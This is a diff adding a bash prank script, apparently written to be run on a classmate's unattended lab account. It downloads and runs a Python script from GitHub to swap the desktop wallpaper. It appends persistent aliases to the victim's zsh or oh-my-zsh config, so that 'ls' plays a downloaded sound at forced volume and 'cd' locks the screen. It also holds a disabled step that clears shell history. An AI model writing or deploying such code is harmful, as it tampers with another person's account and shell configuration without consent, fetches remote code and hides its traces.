@@ -1,0 +1,152 @@
+#!/bin/bash
+
+function remove_prev_lsound_zsh()
+{
+	rm -f $(sed -nE 's|.*(~/.*\.ogg).*|\1|p' ~/.zshrc)
+	alias_at_line=$(grep -nE "#lsound_[0-9a-f]{12}" ~/.zshrc)
+	alias_at_line=${alias_at_line/:*/}
+	sed -i "${alias_at_line}d" ~/.zshrc
+}
+
+function do_ls_zsh()
+{
+	if [ "$(grep -E "#lsound_[0-9a-f]{12}" ~/.zshrc)" ]; then
+		remove_prev_lsound_zsh
+	fi
+	echo "alias ls='(pactl set-sink-mute 0 1 && pactl set-sink-mute 0 0 && pactl set-sink-volume 0 75% && paplay ~/.${SOUND}.wav &) ; ls $1 #lsound_${RANDOM_ID}'" >> ~/.zshrc
+	curl https://raw.githubusercontent.com/clinche/Troll_42/master/sound/gg.wav -o ~/.gg.wav
+}
+
+function remove_prev_lsound_oh_my_zsh()
+{
+
+	file_to_remove=$(sed -nE 's|.*(~/.*\.ogg).*|\1|p' ~/.oh-my-zsh/custom/alias.zsh)
+	rm -f ${file_to_remove}
+	alias_at_line=$(grep -nE "#lsound_[0-9a-f]{12}" ~/.oh-my-zsh/custom/alias.zsh)
+	alias_at_line=${alias_at_line/:*/}
+	sed -i "${alias_at_line}d" ~/.oh-my-zsh/custom/alias.zsh
+}
+
+function do_ls_oh_my_zsh()
+{
+	if [ "$(grep -E "#lsound_[0-9a-f]{12}" ~/.oh-my-zsh/custom/alias.zsh)" ]; then
+		remove_prev_lsound_oh_my_zsh
+	fi
+	echo "alias ls='(pactl set-sink-mute 0 1 && pactl set-sink-mute 0 0 && pactl set-sink-volume 0 75% && paplay ~/.${SOUND}.ogg &) ; ls -G $1 #lsound_${RANDOM_ID}'" >> ~/.oh-my-zsh/custom/alias.zsh
+	curl https://raw.githubusercontent.com/clinche/Troll_42/master/sound/${SOUND}.ogg -o ~/.${SOUND}.ogg
+}
+
+function remove_prev_lokcd_zsh()
+{
+	alias_at_line=$(grep -nE "#lokcd_[0-9a-f]{12}" ~/.zshrc)
+	alias_at_line=${alias_at_line/:*/}
+	sed -i "${alias_at_line}d" ~/.zshrc
+}
+
+function do_lokcd_zsh()
+{
+	if [ "$(grep -E "#lokcd_[0-9a-f]{12}" ~/.zshrc)" ]; then
+		remove_prev_lokcd_zsh
+	fi
+	echo "alias cd='ft_lock #lokcd_${RANDOM_ID}'" >> ~/.zshrc
+}
+
+function remove_prev_lokcd_oh_my_zsh()
+{
+	alias_at_line=$(grep -nE "#lokcd_[0-9a-f]{12}" ~/.oh-my-zsh/custom/alias.zsh)
+	alias_at_line=${alias_at_line/:*/}
+	sed -i "${alias_at_line}d" ~/.oh-my-zsh/custom/alias.zsh
+}
+
+function do_lokcd_oh_my_zsh()
+{
+	if [ "$(grep -E "#lokcd_[0-9a-f]{12}" ~/.oh-my-zsh/custom/alias.zsh)" ]; then
+		remove_prev_lokcd_oh_my_zsh
+	fi
+	echo "alias cd='ft_lock #lokcd_${RANDOM_ID}'" >> ~/.oh-my-zsh/custom/alias.zsh
+}
+
+function retrieve_shell()
+{
+	if [ ! -z "${SHELL}" ]; then
+		current_shell=${SHELL/*\//}
+		if [ "${current_shell}" == "zsh" ]; then
+			have_oh_my_zsh=$(grep -v "^#" ~/.zshrc | grep 'source $ZSH/oh-my-zsh.sh')
+			if [ -z "${have_oh_my_zsh}" ]; then
+				CURRENT_SHELL="zsh"
+			else
+				CURRENT_SHELL="oh-my-zsh"
+			fi
+		elif [ ${current_shell} == "bash" ]; then
+			CURRENT_SHELL="bash"
+		fi
+	fi
+}
+
+function wallpaper_changer()
+{
+	python3 /tmp/bbid.py -s ${WALLPAPER} --limit 1 -o downloads
+	mv ./downloads/* /nfs/homes/$USER/Documents/.image.jpg
+	rm -rf ./downloads/*
+	gsettings set org.gnome.desktop.background picture-uri 'file:///nfs/homes/'$USER'/Documents/.image.jpg'
+}
+
+function do_backup_zsh()
+{
+	if [ ! -f ~/.oh-my-zsh/custom/.alias.zsh.backup ]; then
+		cp ~/.zshrc ~/.zshrc.${RANDOM_ID}
+		touch .zshrc.backup
+	fi
+}
+
+function do_backup_oh_my_zsh()
+{
+	if [ ! -f ~/.oh-my-zsh/custom/.alias.zsh.backup ]; then
+		cp ~/.oh-my-zsh/custom/alias.zsh ~/.oh-my-zsh/custom/.alias.zsh.${RANDOM_ID}
+		touch ~/.oh-my-zsh/custom/.alias.zsh.backup
+	fi
+}
+
+function init()
+{
+	RANDOM_ID=$(openssl rand -hex 6)
+	retrieve_shell
+	if [ ! -f /tmp/bbid.py ]; then
+		wget https://raw.githubusercontent.com/clinche/Troll_42/master/bbid.py \
+			-O /tmp/bbid.py
+		chmod +x /tmp/bbid.py
+	fi
+}
+
+function clear_and_exit()
+{
+	clear
+	history -c
+}
+
+function main()
+{
+	init
+	wallpaper_changer
+	if [ "${CURRENT_SHELL}" == "zsh" ]; then
+		do_backup_zsh
+		do_ls_zsh
+		do_lokcd_zsh
+	elif [ "${CURRENT_SHELL}" == "oh-my-zsh" ]; then
+		do_backup_oh_my_zsh
+		do_ls_oh_my_zsh
+		do_lokcd_oh_my_zsh
+	else
+		printf "Bash not implemented\n"
+	fi
+	#clear_and_exit
+}
+
+if [ -z "${SOUND}" ]; then
+	SOUND=amine-mojito-zbeub-zbeub
+fi
+if [ -z "${WALLPAPER}" ]; then
+	WALLPAPER=multipla
+fi
+
+main
